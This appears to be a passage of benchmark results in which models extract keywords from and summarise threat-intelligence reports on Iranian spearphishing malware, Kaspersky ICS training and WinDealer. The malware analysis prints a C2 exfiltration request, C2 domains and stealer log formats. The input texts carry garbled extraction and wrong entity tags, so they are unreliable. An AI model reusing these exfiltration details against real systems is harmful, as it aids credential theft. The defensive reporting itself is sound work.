high. Based on observed wallet IDs, Trend Micro estimates TeamTNT mined over 17 Monero coins worth around $3,800. But the electricity cost to mine that amount would be around $12,000. Stolen cloud credentials could also let TeamTNT access confidential data or install more malware. Trend Micro recommends security practices like least privilege access, private key SSH authentication, patching, and using cloud-focused security solutions. They also provide technical details on TeamTNT's malware like IRC bots, credential stealers, and the Diamorphine rootkit. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3468834688346883, "gpt3/lexical/rouge_rouge2": 0.08174386920980926, "gpt3/lexical/rouge_rougeL": 0.17344173441734415, "gpt3/lexical/rouge_rougeLsum": 0.17344173441734415, "gpt3_generated_text": ["This article provides an overview of the hacking group TeamTNT and their activities in the Linux threat landscape in 2020 and early 2021. The group primarily targets Linux environments, including organizations' cloud infrastructures, with the main motivation of monetary gain. The article discusses the background of TeamTNT, including their signatures and the possibility of German-speaking members. The group is believed to have at least 12 members and is actively hiring new members. They communicate through social media, often announcing their campaigns and new malware features. The article also highlights some of the group's campaigns and targets, including the deployment of cryptocurrency miners and DDoS botnets. Additionally, it discusses the group's use of IRC bots and malicious shell scripts for stealing cloud credentials. Overall, the article provides insights into the activities of TeamTNT and their impact on the Linux environment, offering valuable information for detection and prevention processes."]}, {"split_name": "test", "sample_id": "test_37", "prompt_text": "Extract the keywords: M A L W A C O M M E P O L E M EINP O S S O FTST D O W NITU L O AAS T W A I O N EDU M AHR S REPBUABCLICNOTKGROUNIDCE(1SEPTESince the Technical Preview of our forthcoming [ORG] Carnegie [ORG] Endowment publication about state - sponsored espionage campaigns was released at [ORG] Black [ORG] Hat [ORG] USA , we have continued to disclose information about current [NORP] Iranian activities in order to promote public education and to provide indicators of compromise . Within our [PERSON] Black [PERSON] Hat presentation , we identi\ufb01ed but did not discuss a series of intrusion attempts conducted in   [DATE] July and [DATE] August , targeting human rights organizations , bloggers and foreign policy institutions . The social engineering techniques and technical operations connected to these spearphishing attempts was moderately more re\ufb01ned than other incidents , and therefore warranted further scrutiny . On initial observation , we \ufb01nd a    diverse set of tactics that have been used to compromise [CARDINAL] at [CARDINAL] least [CARDINAL] ninety uniquely identi\ufb01able malware victims   within a limited window into the overall activities , with more intrusions through credential theft . These spearphishing campaigns are also notable since their targeting is more broad than [NORP] Iranians activists , and have a demonstrable interest in targets in [GPE] Saudi [GPE] Arabia , [GPE] Iraq and [GPE] Palestine . This public notice is intended to describe a series of intrusions conducted through a suite of custom and off- the - shelf malware agents targeting interests aligned with the [NORP] Iranian security policies . We also provide some insight into the nature of the operators provided by their engagement in a honeypot under our control . INCIDENTANDIMPACTOn [DATE] August 4 , [DATE] 2016 , the [PERSON] Gmail account of an unknown individual was compromised in order to conduct spearphishing campaigns against a diverse set of targets related to [GPE] Iran . The spearphishing attempt posed as a message from the Director of [ORG] United for [GPE] Iran , a U.S.-based human rights organization , claiming that the organization had developed a secure communications tool for activists . The message was sent from an account created under her name on lesser known email provider ( 1&1 \u2019s Mail.com ) , a common tactic in [DATE] recent [DATE] months , with a link to a \ufb01le hosted on [ORG] Dropbox and an additional credential phishing attempt . Once the   observed [PERSON] Gmail account was under their control , the actors then forwarded malware to [CARDINAL] over [CARDINAL] a [CARDINAL] hundred of their contacts , ranging from an address for [ORG] the [ORG] United [ORG] Nations [ORG] Refugee [ORG] Agency in [GPE] Turkey to a site contact forReza Pahlavi , the son of the deposed [PERSON] Shah [PERSON] Mohammad [PERSON] Reza [PERSON] Pahlavi . The incident represents only a more recent example of a common set of tactic and tools that have been used by a discrete set of actors in [GPE] Iran . Over [DATE] the [DATE] summer , we have found similar spearphishing attempts posing an array of commonplace software , including [PERSON] Adobe [PERSON] Flash , [ORG] TeamSpeak , [ORG] Mozilla [ORG] Firefox , and a video game services company ( [ORG] Multiplay ) . Still other cases have included documents with embedded malware . In all of these cases , the software is a primary stage dropper that provides reconnaissance and remote access for further intrusions . Our initial observation of the dropper and the social engineering tactics came out a series of documents that were sent to [NORP] European human rights advocates in [DATE] July . These documents were similarly sent from an impersonation account for well - known organizations created on [ORG] Mail.com , under the pretense of important news . The malware was embedded as an object in the document that would be activated when the target clicked on an icon , typically posing as an [PRODUCT] Excel \ufb01le   or an image , which the message would claim were lists of names or other items pertinent to the target . In our [DATE] August [DATE] 24 public notice \" Increased Use of Android Malware Targeting Journalists , \" we documented a set of remote access tools for the [ORG] Android platform being used by [NORP] Iranian actors to target dissidents and independent media outside of the country . Included in that report was [CARDINAL] one commonplace tool , [PERSON] DroidJack , which masqueraded as a secure communications tools . As recently as Sunday , [DATE] August [DATE] 28 , this [ORG] RAT was used once again to target journalists and the foreign policy establishment , when the Telegram of [CARDINAL] one prominent journalist was compromised \u2013 in this case , posing as an additional set of stickers for [ORG] Telegram . In this case , the [ORG] RAT appeared to provide the intruders a vector to access [ORG] Telegram credentials for individuals outside of [GPE] Iran , which is relevant to our description of other tactics used to breach users of the extremely popular service . The [ORG] Android malware in the previous notice mirrored a sustained campaign that we had begun monitoring , including both agents impersonating TeamSpeak . Once again , in the case of the [ORG] Telegram sticker incident , [ORG] Android malware was sent alongside a custom [PRODUCT] Windows agent . The concurrent targeting and inclusion of both the custom [PRODUCT] Windows malware and the [PRODUCT] DroidJack APKs on [CARDINAL] one \ufb01ctitious download site leads us to believe that the same group is behind the attempts . These campaigns   have occurred alongside [ORG] Rocket [ORG] Kitten infrastructure , but are conducted in a more professional manner with distinct tools , representing either a subgroup or a separate effort . The effort may also be connected to otherknown groups based on some indicators , so we do not attempt to attribute the actors at this point outside of their [NORP] Iranian origin and alignment with state interests . Based on records from multiple command and control servers , we \ufb01nd a distributed set of victims of the   malware , primarily [NORP] Iranians inside of the country , [NORP] Iranians abroad , and institutions in the [LANGUAGE] Arabic - speaking [LOC] Middle [LOC] East and [GPE] North [GPE] Africa . As we noted in our update on the [ORG] Infy campaign in the Technical Preview , mapping victimology based purely on [ORG] IP addresses can be especially hard when it comes to [GPE] Iran , due to the widespread use of circumvention tools . However , we believe that the overall themes found within such analysis are correct . The victimology of the malware also aligns with observed patterns in the targeting of credential phishing and other social engineering activities by the group . In the interest of expediency , the victimology and full set of tactics is not in scope of this disclosure , and instead we will provide more details on the themes within our full publication . MAL W AREAs described previously , this actor makes use of a number of social engineering tricks . These tricks might vary in nature , but quite often they involve bundling legitimate software installers with a copy of [CARDINAL] one of their malware . In the case of the [ORG] TeamSpeak . EXE payload , once the bundle is executed it installs and launches the \ufb01rst   stage of their malware toolset , normally located at % AppData%\\Roaming\\Microsoft\\SpoonBuster\\dwm.exe . We call this \ufb01rst stage sample [ORG] ExtremeDownloader , due to a debug string that was left in the binary . C:\\Users\\Not Found\\Documents\\Visual [PERSON] Studio 2013\\Projects\\ExtremeDownloader_alijavad_952\\trunk\\Downloader\\Release\\Downloader.pdbThe general purpose of [ORG] ExtremeDownloader is to collect information on the infected system , send this information to a remote location , and wait for instructions to eventually download and execute further malicious software . All the ex\ufb01ltrated information is then categorized by an identi\ufb01er which is the combination    of the computer name and the hard disk volume serial number . The precon\ufb01gured parameters , such as [ORG] Command [ORG] & [ORG] Control location and encryption key , are recognizable in the binary as base64 obfuscated strings . This also includes a public 1024 [ORG] RSA key:-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDPlwHiG068RYDD1NLvCFAWNMs6 VR4I2kNuTei/+rCnUuj92hDFFXrntXIi7LLn8XsB3ls1sJ0RcAcrKVzQgzY+DOOT A4dhOpFlO3v / bj3OwRqCdNJwJJfpYCBYQaLND9eo49BCK+pwVVB55TJYjCkVowGx ZfJJdjYc3oDZKbKOawIDAQAB -----END PUBLIC KEY-----In order to pro\ufb01le the system , [ORG] ExtremeDownloader collects an extensive amount of details , including   information on the hardware , the networking , the existing users , processes , and services . In doing so , the malware makes extensive use of WMI.The aggregated pro\ufb01le is then posted to the [ORG] C&C with an HTTP request like following : POST /utility / update / post.php HTTP/1.1 Accept : * / * Content - Type : multipart / form - data ; boundary = D514116929C24f35AE047F2B82C59B08 Content - Length : [CARDINAL] 49810 User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 7.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.1 ; Trident/4.0 ; [DATE] SLCC2 ; .NET CLR 2.0.50727 ; .NET CLR 3.5.30729 ; .NET [ORG] CLR [ORG] 3.0.30729 ; [ORG] Media [ORG] Center PC [CARDINAL] 6.0 ; .NET4.0C ; .NET4.0E ; InfoPath.2 ) Host : www.apache-utility.com Cache - [ORG] Control : no - cache --D514116929C24f35AE047F2B82C59B08 Content - Disposition : form - data ; name=\"EKY \" Content - Disposition : form - data ; [ORG] name=\"ID \" Content - Disposition : form - data ; [ORG] name=\"Data\"The content of the \u201c Data \u201d section would be the computer pro\ufb01le in encrypted form , which would then be   stored in a dedicated folder on the [FAC] C&C with the \ufb01le name SysInfo.txt . At this point , we believe the attackers would selectively decide which infected computers to compromise further with the [ORDINAL] second stage malware . If instructed to do so , [ORG] ExtremeDownloader would then download an executable normally named contask.exe . We refer to this particular payload as [LOC] Moreoriz , because of a mutex it creates with name Global\\Moreoriz , or simply [PERSON] Dropper , also due to a debug string found in the binary : C:\\Users\\Not Found\\Documents\\Visual [PERSON] Studio [TIME] 2013\\Projects\\TinyExe\\Release\\Dropper.pdbThis [TIME] second stage dropper is limited in functionality , and it mostly used just to connect to a [ORDINAL] second Command Meterpreter in order to grant a reverse shell to the attackers . In an effort to lure the attackers into interacting with us that we describe in the following section of this report , we managed to obtain one of the collection utilities they make use of . We refer to this malware as [PERSON] Strealer , also because of a debug string available in the binary ( please note the typo):C:\\Users\\AB)\\Documents\\Visual [PERSON] Studio 2013\\Projects\\Strealer\\Stealer_Final\\Release\\Stealer.pdbWhile the name of the project and functionality recalls the [ORG] Stealer malware of [ORG] Flying [ORG] Kitten , there does not appear to be a relation between the agents as they do n't appear to signi\ufb01cantly share characteristics . Once executed , [PERSON] Strealer \ufb01rst checks whether it is installed with persistence , and if not it copies itself to the   location % AppData%\\Local\\Mozilla\\Pro\ufb01les\\MozillaService.exe and instantiates a new process from there . The purpose of [PERSON] Strealer is to steal credentials and cookies from web browsers . Its design is very simple , and yet effective . [PERSON] Strealer knows how to locate , decrypt , and read stored credentials and cookies from Internet Explorer , Firefox , [ORG] Chrome , and [ORG] Opera . These stolen credentials are then normally stored in a JSON - like format in the % AppData%\\Local\\Mozilla\\Pro\ufb01les\\Log under the names for example like chromeLogins.sql and   chromeCookies.sql . In the case of credentials , the log format would be:{\\\"Username\\\":\\\"%s\\\",\\\"Password\\\":\\\"%s\\\",\\\"url\\\":\\\"%s\\\"}While the following format is used for logging stolen cookies:{\\\"id\\\":\\\"%S\\\",\\\"host\\\":\\\"%S\\\",\\\"name\\\":\\\"%S\\\",\\\"value\\\":\\\"%S\\\",\\\"path\\\":\\\"%S\\\",\\\"expiry\\\":\\\"%S\\\",\\\"isHttpOnly\\\":\\\"%S\\ \" , \\\"isSecure\\\":\\\"%S\\\",\\\"hostOnly\\\":\\\"%S\\\",\\\"session\\\":\\\"%S\\\",\\\"storeId\\\":\\\"%S\\\"}Additionally , the malware is also provided with a generic keylogger and clipboard stealer , which are simply implemented with the traditional GetClipboardData and GetKeyboardState / GetKeyState techniques . The intercepted keystrokes and clipboard are then nicely logged in detail in a dedicated \ufb01le normally located at   % AppData%\\Local\\Mozilla\\Pro\ufb01les\\Log\\kgservice.sql . Following is an indicative content of how the keylogger   log \ufb01le would look like : [ Chrome - Google Chrome ] date : 2016/8/31 time : 17:28:53 [ Ctrl ] [ Chrome - Google Chrome ] date : 2016/8/31 time : 17:28:53 google.com[Enter ] [ New Tab - Google Chrome ] date : 2016/8/31 time : 17:28:55 [ Ctrl ] [ Untitled - Google Chrome ] date : 2016/8/31 time : 17:28:55 * * * * * * * * END [NORP] Clipboard*******These logs are then collected and posted to yet another [ORG] Command [ORG] & [ORG] Control server located at update- \ufb01nder.com . The structure utilized in the HTTP ex\ufb01ltration protocol , is very much similar to the ones adopted by    ExtremeDownloader . OPERATORSWhen realizing that in the chain of compromise the attackers would manually interact with infected computers through the use of a Meterpreter shell , we decided to set up a \u201c honeypot . \u201d We created a somewhat realistic virtualized workstation which would appear belonging to a person engaged in researching on human rights abuses in [GPE] Iran . We downloaded publicly available reports , created a realistic folder structure , and installed various commodity software that a regular person would use . Then we infected the \u201c honeypot \u201d workstation with the [ORG] Dropper , let it report back to its [ORG] Command [ORG] & [ORG] Control and waited for activity . [TIME] Approximately [TIME] one [TIME] hour later we observed activity on the system . The attackers connected through their [GPE] Metasploit reverse shell , installed a copy of TightVNC , installed a copy of their [PERSON] Strealer backdoor and started ex\ufb01ltrating data from our honeypot , while we pretended to unsuspectingly keep on working on document   drafts and reading reports from various human rights organizations , and chatting to some \ufb01ctitious [ORDINAL] third   person about some upcoming campaign . When we noticed that some of the reports and documents we had downloaded from the Internet and placed in the workstation were being ex\ufb01ltrated by the attackers , we swiftly created some documents with the   CanaryTokens service that had credible and interesting \ufb01le names pertinent to human rights issues in [GPE] Iran ,   and placed them among other original \ufb01les . CanaryTokens embeds remote resources as triggers inside   commonplace document , for example Of\ufb01ce \ufb01les , to notify whenever they are opened and identify from which    IP address . Surely enough , the attackers ex\ufb01ltrated the baits , and opened them , resulting in alerts being   delivered to us . The [ORG] IP address from which the bait documents were opened appeared to be a [ORG] VPN endpoint . We then attempted creating similar bait documents with different \ufb01le formats , in order to see whether that would trigger   a different behavior . Interestingly , this led to the attackers ex\ufb01ltrating and opening these newer documents   too , possibly from a different location , exposing what we believe to be their actual originating [ORG] IP address . This suggests the attackers are in fact of [NORP] Iranian origin , and might be located in the city of [GPE] Karaj , not far from the capital [GPE] Tehran . CONTACTCertain information has been withheld for privacy or operational reasons outlined above , but we are happy to provide information to security professionals and targeted organizations in order to support defensive work . We also welcome samples and feedback on our research . If you have any questions , concerns , or requests for further information please contact us . EMAILC L A U D I O ( N E X @ A M N E S T Y . O R G ) Fingerprint : E063 75E6 B9E2 6745 656C 63DE 8F28 F25B AAA3 9B12C O LLI N ( C D A @ A S C . [ORG] U [ORG] P [ORG] E [ORG] N [ORG] N . E D U ) PGP Key : url Fingerprint : 510E 8BFC A60E 84B4 40EA 0F32 FAFB F2FAIMNADCIHCIAT O RSO FNEREADABLC O M PR O M IEFORMurl Filename C2P A Y L O A D S multiplay-register.exe [ORG] TeamSpeak . [PERSON] EXEE [PERSON] X [PERSON] T [PERSON] R [PERSON] E [PERSON] M [PERSON] E [PERSON] D [PERSON] O [PERSON] W [PERSON] N [PERSON] L [PERSON] O A D E R apache-utility.com microsoft-hot\ufb01x.com /M O R E O R I ZD R O P P E R update-\ufb01nder.com T I G H T V N C vn.exe2016 , Creative Commons Attribution - NonCommercial - ShareAlike 4.0 International Ion Template by [ORG] TEMPLATED", "generated_text": "PDF; Black Hat; a series; intrusions; July; August; human rights organizations; bloggers; foreign policy institutions; this public notice; August; espionage campaigns; the Middle East; info; cyberespionage; campaigns; the Gmail account; a message; the Director; United for Iran; a U.S.-based human rights organization; a secure communications tool; activists; emails; Dropbox; credential theft; the Gmail account; the actors; emails; over a hundred; their contacts; an address; the United Nations Refugee Agency; Turkey; Reza Pahlavi; the son; the deposed Shah Mohammad Reza Pahlavi; the document; a primary stage dropper; reconnaissance; remote access; DroidJack; access; a series; tactics; the Iranian security policy; 2017; the devices; the target; app; the Middle East; espionage.", "ref_text": "<START-1>The PDF describes a series of spearphishing campaigns targeting human rights organizations, bloggers, and foreign policy institutions. The campaigns were conducted by an Iranian state-sponsored hacking group in July-August 2016. The group impersonated human rights organizations and activists, sending emails with malware from fake accounts. The malware included Windows and Android remote access tools disguised as legitimate software like TeamSpeak and Telegram. An info-stealing Windows malware called Strealer was used to harvest credentials and data. Analysis of the command infrastructure revealed around 90 identifiable victims, with more breached via stolen credentials. Victims included Iranian dissidents as well as targets in Saudi Arabia, Iraq, and Palestine aligned with Iranian security interests. The researchers engaged with the hackers through a honeypot, tracing activity to an IP address in Iran. The technical sophistication was higher than typical Iranian campaigns. The tools, tactics, and infrastructure indicate alignment with state interests but attribution remains unclear. The social engineering, malware, and infrastructure show overlaps with other known campaigns like Rocket Kitten, but appear to be a distinct effort. The broad targeting beyond just Iranian dissidents is notable, demonstrating expanded interests. The report provides indicators of compromise to help organizations detect and defend against the malware and infrastructure. Overall, the PDF provides insights into an Iranian state-linked hacking campaign combining social engineering, custom malware, and credential theft to compromise targets across the Middle East aligned with Iranian security priorities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44562334217506633, "gpt3/lexical/rouge_rouge2": 0.128, "gpt3/lexical/rouge_rougeL": 0.24933687002652521, "gpt3/lexical/rouge_rougeLsum": 0.24933687002652521, "gpt3_generated_text": ["This article discusses a series of cyberespionage campaigns targeting human rights organizations, bloggers, and foreign policy institutions in the Middle East. In July and August, Iranian actors conducted intrusions using sophisticated social engineering tactics and malware to compromise at least ninety victims through credential theft. The attackers utilized spearphishing attempts posing as secure communications tools and common software to gain access to sensitive information. These incidents highlight the ongoing threat of cyberespionage in the region, with actors targeting a diverse set of interests aligned with Iranian security policies. The article also details specific incidents, such as the compromise of a Gmail account and the use of Android malware to target journalists and dissidents. This public notice aims to raise awareness about the tactics and tools used in these espionage campaigns and provide insights into the nature of the operators behind them."]}, {"split_name": "test", "sample_id": "test_38", "prompt_text": "Extract the keywords: [PERSON] Kaspersky [PERSON] Industrial CyberSecurityKaspersky Industrial CyberSecurity Training and Awareness Programswww.kaspersky.com www.kaspersky.com/ics # truecybersecurity # truecybersecurityKaspersky [ORG] Industrial [ORG] CyberSecurity [ORG] Training and Awareness ProgramsLeverage Kaspersky Lab \u2019s Industrial [ORG] CyberSecurity knowledge , experience and threat intelli- gence through these innovative educational programs . Human error is responsible for [PERCENT] around 80 % of all cybersecurity incidents . When these incidents can lead to the breakdown of critical systems or can bring industrial processes to a complete halt , human error becomes expensive and potentially lethal . In an environment where the threat landscape is constantly evolving , and targeted attacks capitalizing in human weakness are on the increase , [CARDINAL] one of your best defenses is a workforce for whom cyber - safe working practices are automatic and instinctive . To achieve this , all your employees need to have a basic awareness of the dangers , and of how to work securely . Those directly engaged in IT / OT cybersecurity must also possess the advanced skills essential to effective threat management and mitigation , as well as to prevention and detection . [PERSON] Kaspersky [PERSON] Industrial [PERSON] CyberSecurity [PERSON] Training and Awareness courses have been developed specifically to enable critical infrastructure operators , utilities providers and manufacturing businesses to better protect their industrial environments against the disruption and damage caused by cyber - incidents and attacks . The Courses ( All training courses are offered in [ORG] English)CyberSecurity [ORG] AwarenessCyberSecurity [ORG] Skills [ORG] Development and [PERSON] TrainingFor your [ORG] Engineers [ORG] / [ORG] Industrial [ORG] Floor [ORG] Workers : [ORG] Basic [ORG] CybersafetyFor [ORG] Management : [ORG] Industrial [ORG] Cybersafety [ORG] GamesFor [ORG] IT / OT Professionals : For IT / OT Security Professionals : Advanced Industrial CyberSecurity in PracticeICS Penetration Testing for ProfessionalsICS Digital Forensics for [ORG] ProfessionalsIndustrial CyberSecurity AwarenessOn - site and online interactive training modules and cybersafety games training for all employees who interact with industrial computerized systems \u2013 on the industrial floor , control room or in the back - office \u2013 and for their managers . Organizations spend [CARDINAL] millions on cybersecurity awareness programs , but few CISOs are really satisfied with the results . What \u2019s wrong ? Most cybersecurity awareness training is too general , too long , too technical and essentially negative . This does not play to people \u2019s core strengths \u2013 their decision - making and learning abilities - and as a result can render training ineffectual . And it does n\u2019t reflect the real - world cybersecurity challenges specific to industrial workforces.1So organizations are seeking more sophisticated behavioral support approaches ( such as corporate culture development ) that focus on issues specific to their working environment and deliver a quantifiable and worthwhile return on their investment . [PERSON] Kaspersky [PERSON] Lab [PERSON] Industrial [PERSON] CyberSecurity [PERSON] Awareness courses work by:\u2022 Changing behavior \u2013 stimulating the individual \u2019s commitment to workingsafely and responsibly , building a corporate environment where \u201c I care about cybersafety , because everyone does here \u2013 it \u2019s part of the job\u201d.\u2022 Combining a motivational approach , gamification , learning techniques , simulated attacks based on real - life industrial situations , and in - depth interactive cybersecurity skills training . How it works \u2013 in detailComprehensive but straightforward \u2013 Training covers a wide range of security issues , from basic cyber - hygiene rules to malware attacks , data leaks and safe social networking , through a series of simple exercises . We use learning techniques \u2013 group dynamics , interactive modules , and gamification based on real - life industrial workplace scenarios \u2013 to make the learning process engaging and relevant . Accessible \u2013 Our [DATE] 1 - day [ORG] Cybersafety [ORG] Awareness course can be taught on - site or at any venue , while [ORG] Kaspersky [ORG] Industrial [ORG] Protection [ORG] Simulation ( KIPS ) , our Industrial CyberSecurity Gaming program , is designed to be played on - line or face - to - face as preferred . To ensure an immersive , real - world learning environment , there are specific KIPS variants for different industries , such as water treatment , or power generation and transmission . Continuous motivation \u2013 We create teachable moments by gamification and competition , and then re - enforce these training moments throughout [DATE] the [DATE] year via online simulated attack exercises , assessment and training campaigns . Changing beliefs \u2013 Employees learn the importance of their own role in protecting against specific threats \u2013 how they can avoid becoming victims and exposing themselves and their workplace to danger and to attack . Building a corporate cybersafety culture \u2013 We train management to become security advocates ; a culture where cybersafety becomes [ORDINAL] second nature is best achieved through management commitment and example , and can not simply be imposed . Positive and collaborative \u2013 We demonstrate how cybersafety practices make a positive contribution to overall operational efficiency and productivity , and promote more effective cooperation with other internal departments , including the IT / OT Security team . Measurable \u2013 We provide tools to measure employee skills , along with corporate - level assessments analyzing workforce attitudes to cybersecurity in their [DATE] daily work.2Cybersecurity skills development and trainingThese courses offer a broad curriculum in cybersecurity topics and techniques for those directly involved with , or planning to be involved with , the security of industrial systems and technologies . All are available either in - class on customer premises or at a local or regional [PERSON] Kaspersky [PERSON] Lab office , if preferred . Participants benefit from working and learning alongside our global experts , who provide inspiration through their own experience at the \u2018 sharp end \u2019 of cybercrime prediction , prevention , detection , and response . Courses include both theoretical classes and hands - on \u2018 labs \u2019 . On completion of each course , participants will be invited to complete an evaluation to validate their knowledge . Grow your organizational expertise These training courses allow organizations to improve their cybersecurity knowledge pool in [CARDINAL] three main areas:\u2022 Fundamental knowledge of industrial control systems cybersecurity [ORG] \u2022 [ORG] \u2022ICS [ORG] Penetration [ORG] Testing [ORG] ICS [ORG] Digital [ORG] ForensicsAdvanced [ORG] Industrial [ORG] CyberSecurity in PracticeProvides your IT / OT professionals with a new insight into your threat landscape and the attack vectors targeting your industrial environment , and arms them with all the skills needed to draw up a basic incident response plan . [ORG] ICS [ORG] Penetration [ORG] Testing [ORG] for [ORG] ProfessionalsEnables [ORG] IT / OT security professionals to conduct comprehensive and thorough pentests in industrial environments , and to make expert recommendations for appropriate remedial action . [ORG] ICS [ORG] Digital [ORG] Forensics [ORG] for [ORG] ProfessionalsEnables [ORG] IT [ORG] / OT security professionals to conduct successful forensic investigations in industrial environments , and to provide expert analysis and recommendations.3The courses in detailTopicsDurationOutcomes / Skills GainedAdvanced Industrial CyberSecurity in Practice\u2022 Overview of current threat landscape , security1 \u2013 [CARDINAL] 2 days\u2022 Understand current industrial cyberthreatsissues , human factors , [ORG] ICS network attacks\u2022 [ORG] Network security in IT and [ORG] ICS environments \u2013 special considerations\u2022 Case study demonstrating the use of prevention , detection and mitigation techniques\u2022 Compliance with industrial standardsand [ORG] legislation\u2022 [ORG] Network topologies and how networksecurity technologies work\u2022 [PRODUCT] Cybersecurity roles and team structures \u2022 Common security mistakes.and how to combat cyber - incidents targeting your industry or organization\u2022 [ORG] Recognize and identify security incidents \u2022 Perform simple investigations \u2022 Draw up and implement an effectiveincident response plan . This course includes highly customized elements , and can be adapted to run over [DATE] 1 [DATE] or [DATE] 2 [DATE] days as preferred . Leads to certification . [ORG] ICS [ORG] Penetration [ORG] Testing [ORG] for [ORG] Professionals\u2022Introduction to [ORG] ICS components , architectures and deployment in industries including : \u2013 Electric power generation & distribution \u2013 [ORG] Oil [ORG] & [ORG] Gas \u2013 [ORG] Transportation\u2022 [ORG] Practical pentesting techniques as appliedto these and other [ORG] ICS [ORG] environments\u2022 Creating an [ORG] ICS [ORG] Pentest [ORG] Plan \u2013 considerationsand constraints [PRODUCT] Information [PRODUCT] gathering\u2022 [PRODUCT] \u2022 [PRODUCT] SCADA and [ORG] PLC systems vulnerability analyses \u2022 Results analysis and reporting \u2022 Practical Labs.5 [GPE] days\u2022 [GPE] Understand and analyze vulnerabilitiesin industrial control systems\u2022 Create an effective ICS Pentesting Plan \u2022 Conduct safe , successful pentests on [GPE] SCADA , PLCs and other elements of ICS\u2022 Make expert recommendations for remedialaction . Leads to certification . [ORG] ICS [ORG] Digital [ORG] Forensics [ORG] for [ORG] Professionals\u2022Introduction to [ORG] ICS components , architectures and deployment in industries including : \u2013 Electric power generation & distribution \u2013 [ORG] Oil [ORG] & [ORG] Gas \u2013 Transportation\u2022 Recognizing and working with the challengesand constraints of [ORG] ICS\u2022 [ORG] Digital [ORG] Forensics techniques as applied to ICSenvironments\u2022 Creating an [ORG] ICS [ORG] Digital [ORG] Forensics [ORG] Plan [ORG] \u2022 [ORG] Manual forensic data acquisition andpreservation \u2013 working with RTOS and [ORG] ICS [ORG] protocols\u2022 Artefacts analysis and anomaly verification [ORG] \u2022 [ORG] Reporting [ORG] \u2022 [ORG] Practical Labs.4 days\u2022 Conduct successful forensic investigationsin [ORG] ICS environments.\u2022 Create an effective [ORG] Digital [ORG] Forensics [ORG] Planfor [ORG] ICS\u2022 [ORG] Collect physical and digital evidence and dealwith it [PERSON] appropriately\u2022 [PERSON] Apply the tools and instruments of digitalforensics to [GPE] SCADA and [PERSON] PLC\u2022 [PERSON] Find traces of intrusion based on artefactsuncovered\u2022 Reconstruct incidents and use time stamps \u2022 Provide expert reporting and actionablerecommendations . Leads to certification . [PERSON] Kaspersky [PERSON] Industrial [PERSON] CyberSecurity is a portfolio of technologies and services designed to secure operational technology layers and elements of your organization \u2013 including [ORG] SCADA servers , HMIs , engineering workstations , PLCs , network connections and even engineers \u2013 without impacting on operational continuity and the consistency of technological process . [ORG] Learn more at www.kaspersky.com/ics4All about [ORG] ICS cybersecurity : url [WORK_OF_ART] Cyber [WORK_OF_ART] Threats [WORK_OF_ART] News : www.securelist.com#truecybersecurity", "generated_text": "Kaspersky Industrial CyberSecurity Training; Awareness; organizations; critical infrastructure operators; utilities providers; manufacturing businesses; cyber-safe working practices; a basic awareness; the dangers; how to work securely; the advanced skills; mitigation; Penetration Testing; Digital Forensics; Professionals; advanced industrial cybersecurity; Practice; Kaspersky Industrial Protection Simulation; KIPS; the learning process; interest; a motivational approach; gamification; learning techniques; real-life industrial workplace scenarios; the learning process; real-world learning; techniques; analysis; the real-world cybersecurity challenges; industrial employees; their challenges; a competitive advantage.", "ref_text": "<START-1>The document outlines Kaspersky's industrial cybersecurity training and awareness programs for critical infrastructure and manufacturing organizations. The courses aim to develop cybersecurity skills and instinctive safe practices in industrial workforces to reduce cyber incidents stemming from human error. The awareness training uses interactive exercises, simulations, and games tailored to different industries to teach basic cyber hygiene and make employees care about cybersafety. It focuses on changing behaviors, building a security culture, and making cybersecurity a collaborative effort. The skills courses provide in-depth cybersecurity education for IT/OT professionals on topics like threat landscapes, incident response, ICS penetration testing, and digital forensics. They enable organizations to grow expertise in assessing vulnerabilities, conducting safe pentests, investigating incidents, and implementing security measures without impacting operations. Kaspersky leverages its ICS experience and threat intelligence to provide accessible, engaging, industry-specific, and measurable security education. The goal is to motivate employees, foster cybersafety, develop technical skills, and ultimately reduce cyber risks stemming from lack of workforce awareness. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5397923875432525, "gpt3/lexical/rouge_rouge2": 0.1602787456445993, "gpt3/lexical/rouge_rougeL": 0.27681660899653976, "gpt3/lexical/rouge_rougeLsum": 0.27681660899653976, "gpt3_generated_text": ["Kaspersky Industrial CyberSecurity offers training and awareness programs for organizations, critical infrastructure operators, utilities providers, and manufacturing businesses. These programs aim to instill cyber-safe working practices and a basic awareness of the dangers and how to work securely in all employees. Additionally, advanced skills in threat management, mitigation, penetration testing, and digital forensics are provided for IT/OT professionals. The training uses a motivational approach, gamification, and real-life industrial workplace scenarios to make the learning process engaging and relevant. It also focuses on changing behavior, building a corporate cybersafety culture, and providing continuous motivation and measurement tools. By addressing the real-world cybersecurity challenges specific to industrial employees, these programs offer a competitive advantage in promoting a positive and collaborative approach to cybersecurity."]}, {"split_name": "test", "sample_id": "test_39", "prompt_text": "Extract the keywords: [PERSON] Malware [PERSON] WinDealer used by [PERSON] LuoYu [PERSON] Attack [PERSON] Groupblogs.jpcert.or.jp/en/2021/10/windealer.html ( [PERSON] Yuma Masubuchi)During [PERSON] JSAC2021 on [DATE] 28 [DATE] January [DATE] 2021 , there was a presentation about an attack group [ORG] LuoYu , which targets [NORP] Korean and [NORP] Japanese organisations since [DATE] 2014 [ 1][2 ] . Recently , JPCERT / CC came across malware [ORG] WinDealer used by this group . This article introduces some findings of our analysis . [PERSON] Malware [PERSON] WinDealer overviewWinDealer steals information of an infected PC and sends it to a [CARDINAL] C2 server as described in Figure [CARDINAL] 1.1/17Figure 1 \uff1a [PERSON] Malware [PERSON] WinDealer behaviour overviewOnce launched , the malware reads configuration from a file under C:\\ProgramData and loads a [ORG] DLL module on its memory . It steals information about the victim PC , network configuration and [ORG] SNS applications etc . and saves them in a file with an \u201c .a \u201d extension under % TEMP% , which is then sent to a C2 server . The following points will be described in the next sections . Read configuration Communicate with [CARDINAL] C2 servers Process and send stolen data [PRODUCT] Functions of modules loaded on memoryRead configurationThe malware stores its configuration in several folders under C:\\ProgramData and reads it when executed . The contents are encoded based on XOR with its key value \u201c b6a7%7486 \u201d . Please refer to [WORK_OF_ART] Appendix [WORK_OF_ART] A for the configuration file path and its contents . Figure 